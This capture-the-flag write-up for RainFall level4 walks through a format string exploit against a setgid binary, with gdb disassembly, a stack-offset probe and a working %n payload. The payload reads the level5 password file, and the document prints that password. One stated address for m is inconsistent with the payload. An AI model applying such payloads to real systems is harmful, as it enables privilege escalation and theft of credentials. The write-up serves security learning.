# level4

## Hint

When we log into the machine as `level4`, we notice a binary:

```shell-session
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```

We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level.

That being said, it seems we need to look into the binary in order to try to understand what input it's awaiting.

## gdb

First, we'll need to see all available global symbols

```shell-session
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
0x08048588  _fp_hw
0x0804858c  _IO_stdin_used
0x080486f8  __FRAME_END__
0x080496fc  __CTOR_LIST__
0x080496fc  __init_array_end
0x080496fc  __init_array_start
0x08049700  __CTOR_END__
0x08049704  __DTOR_LIST__
0x08049708  __DTOR_END__
0x0804970c  __JCR_END__
0x0804970c  __JCR_LIST__
0x08049710  _DYNAMIC
0x080497dc  _GLOBAL_OFFSET_TABLE_
0x080497fc  __data_start
0x080497fc  data_start
0x08049800  __dso_handle
0x08049804  stdin@@GLIBC_2.0
0x08049808  completed.6159
0x0804980c  dtor_idx.6161
0x08049810  m                                                  <-- Global m variable
gdb-peda$
```

We can see that there is a global variable `m` like in the previous level. Let's see if it is in the .bss section aswell.

```shell-session
level4@RainFall:~$ objdump -x level4
[...]
08048390 g     F .text	00000000              _start
08048588 g     O .rodata	00000004              _fp_hw
08049810 g     O .bss	00000004              m                <-- Global m variable
08049804 g       *ABS*	00000000              __bss_start
080484a7 g     F .text	0000000d              main
[...]
```

Yes ! So we have `m` a global uninitialised variable in the .bss section.


Let's look at the assembly code of the binary:


```shell-session
level4@RainFall:~$ gdb -q ./level4
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>                      <-- Call to n() function
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.
```
Looks like the same as level3, hoewever the function name is `n` now.

Let's look at `n`:

```shell-session
gdb-peda$ pdisas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218                          <-- Space of 536 bytes allocated for the stack
   0x08048460 <+9>:	mov    eax,ds:0x8049804                   <-- Load of stdin
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax            <-- Set stdin as 3rd argument to fgets()
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200          <-- Set 0x200 as 2nd argument to fgets()
   0x08048471 <+26>:	lea    eax,[ebp-0x208]                    <-- Load char buffer[520]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax                <-- Set char buffer as 1st argument to fgets()
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>              <-- Call to fgget(buffer, 0x200, stdin)
   0x0804847f <+40>:	lea    eax,[ebp-0x208]                    <-- Load char buffer[520]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax                <-- Set char buffer as 1st argument to p()
   0x08048488 <+49>:	call   0x8048444 <p>                      <-- Call to p(buffer)
   0x0804848d <+54>:	mov    eax,ds:0x8049810                   <-- Load of m
   0x08048492 <+59>:	cmp    eax,0x1025544                      <-- Compare m and 0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>                   <-- Jump to n+78 if m != 0x1025544
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590          <-- Set "/bin/cat /home/user/level5/.pass" as 1st argument to system()
   0x080484a0 <+73>:	call   0x8048360 <system@plt>             <-- Call to system("/bin/cat /home/user/level5/.pass")
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.
```

And finally the `p` function:

```shell-session
gdb-peda$ pdisas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18                           <-- Space of 24 bytes allocated for the stack
=> 0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]            <-- Load of char buffer
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax                <-- Set char buffer as 1st argument to printf()
   0x08048450 <+12>:	call   0x8048340 <printf@plt>             <-- Call to printf(buffer)
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.
```

It looks like we have the same patern like the level3: a format string attack.

# Format String attack

*copy from level3*

The vulnerabilty here is clearly the usage of an unsanitized user-defined conversion string and the lack of variadic argument to `printf`. This combination is very dangerous as it allows the user to display data and addresses found in the stack, and it's precisely what is required by this exercise as we can read [here](https://owasp.org/www-community/attacks/Format_string_attack):
> The attack could be executed when the application doesn’t properly validate the submitted input.
> In this case, if a Format String parameter, like %x, is inserted into the posted data, the string is parsed by the Format Function, and the conversion specified in the parameters is executed.
> However, the Format Function is expecting more arguments as input, and if these arguments are not supplied, the function could read or write the stack.

On top of that, we have type conversions and options at our disposal to access arbitrary positionnal arguments on the stack, namely:
- option `$` that is used with an integer `i` to access the `ith` argument positionned after printf
- type conversion `%n` that inserts an integer corresponding to the number of bytes written so far in the type conversion format.

This means:
```c
int main(int ac, char *argv[])
{
    int m;

    if (ac != 2)
        return 0;

    printf("%s%2$n", argv[1], &m);

    printf("\n%d\n", m);

    return 0;
}
```

This will insert n from argv[1] bytes to 'm'.

```shell-session
$ ./a.out abc
3
```

And this display the number of bytes in 'm'.

# Plan

Pretty much the same as level3.

1. We have to find the address of the global variable `m` in the .bss section. Wich is outside of the control flow of the program.
3. We must find the format string direct access to be able to do our Format String attack.
2. We must write 16930116(10) bytes in the global variable `m` to trigger the Format String attack and get the shell.

# Proceed

1. From the objdump of the binary, we can see that the global variable `m` is at the address 0x8049804.
2. We will pass a custom python script to print the addresses in the stack. with a custom format string to see where our address start to pop off the stack. Then we  will get our Format String address.


```shell-code
level4@RainFall:~$ python -c 'print "BBBB" + "|-|%08x"*20' | ./level4
BBBB|-|b7ff26b0|-|bffff794|-|b7fd0ff4|-|00000000|-|00000000|-|bffff758|-|0804848d|-|bffff550|-|00000200|-|b7fd1ac0|-|b7ff37d0|-|42424242|-|257c2d7c|-|7c783830|-|30257c2d|-|2d7c7838|-|3830257c|-|7c2d7c78|-|78383025|-|257c2d7c
```

We need to find BBBB with is 0x42424242 in the stack.

We can find the Format String address at the 12th position of the stack.

We can verify it with the following command:

```shell-code
level4@RainFall:~$ python -c 'print "BBBB.%12$x"'| ./level4
BBBB.42424242
```

Which is indeed the correct position.

3. We will use the format string direct access address to write 16930116(10) bytes in the global variable `m` to trigger the Format String attack and get the call to system().

We must substract 4 bytes from the total amout of bytes to write to leave the place for the Format String address and have the correct amount for the conditional jump.
So it will be 16930116(10) bytes - 4 = 16930112(10) bytes.

```shell-code
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' | ./level4
[...]
                                                          �
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

This time we don't have a shell. The call to system seems like having a different command than "/bin/sh".

```shell-code
gdb-peda$ disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218
   0x08048460 <+9>:	mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.
gdb-peda$ x/s 0x8048590
0x8048590:	 "/bin/cat /home/user/level5/.pass"
```

We can see that the call to system() is directly executing "/bin/cat /home/user/level5/.pass"
